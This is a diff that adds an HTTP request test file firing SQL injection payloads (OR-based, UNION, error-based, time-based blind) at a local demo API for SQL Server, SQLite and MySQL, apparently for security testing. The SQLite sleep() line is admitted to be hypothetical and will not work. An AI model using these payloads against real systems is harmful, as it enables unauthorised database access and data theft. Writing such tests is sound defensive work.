@@ -1,0 +1,74 @@
+### Test SQL Injection against SqlServer
+
+# Baseline Test
+GET https://localhost:44351/api/si/SqlServer?name=Admin
+
+### Test SQL Injection against SqlServer
+
+# Basic OR-based injection
+GET https://localhost:44351/api/si/SqlServer?name=NotAdmin' OR '1'='1
+
+### Test SQL Injection against SqlServer
+
+# Union-based injection
+GET https://localhost:44351/api/si/SqlServer?name=Admin' UNION SELECT null, @@version--
+
+### Test SQL Injection against SqlServer
+
+# Error-based injection
+GET https://localhost:44351/api/si/SqlServer?name=Admin' OR 1=CONVERT(int, (SELECT @@version))--
+
+### Test SQL Injection against SqlServer
+
+# Time-based Blind SQL injection
+GET https://localhost:44351/api/si/SqlServer?name=Admin'; WAITFOR DELAY '00:00:10'--
+
+### Test SQL Injection against Sqlite
+
+# Baseline Test
+GET https://localhost:44351/api/si/Sqlite?name=Admin
+
+### Test SQL Injection against Sqlite
+
+# Basic OR-based injection
+GET https://localhost:44351/api/si/Sqlite?name=Admin' OR '1'='1
+
+### Test SQL Injection against Sqlite
+
+# Union-based injection
+GET https://localhost:44351/api/si/Sqlite?name=Admin' UNION SELECT null, sqlite_version()--
+
+### Test SQL Injection against Sqlite
+
+# Error-based injection (SQLite doesn't output errors but is known for using type confusion)
+GET https://localhost:44351/api/si/Sqlite?name=Admin' || (SELECT randomblob(1000000000))--
+
+### Test SQL Injection against Sqlite
+
+# Time-based Blind SQL injection (SQLite doesn't support this, hypothetical example might be pause via recursive CTE)
+GET https://localhost:44351/api/si/Sqlite?name=Admin' || (SELECT sleep(10))--
+
+### Test SQL Injection against MySql
+
+# Baseline Test
+GET https://localhost:44351/api/si/MySql?name=Admin
+
+### Test SQL Injection against MySql
+
+# Basic OR-based injection
+GET https://localhost:44351/api/si/MySql?name=NotAdmin' OR '1'='1
+
+### Test SQL Injection against MySql
+
+# Union-based injection
+GET https://localhost:44351/api/si/MySql?name=NotAdmin' UNION SELECT null, version() -- 
+
+### Test SQL Injection against MySql
+
+# Error-based injection
+GET https://localhost:44351/api/si/MySql?name=NotAdmin' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e)) -- 
+
+### Test SQL Injection against MySql
+
+# Time-based Blind SQL injection
+GET https://localhost:44351/api/si/MySql?name=NotAdmin' AND SLEEP(10) -- 
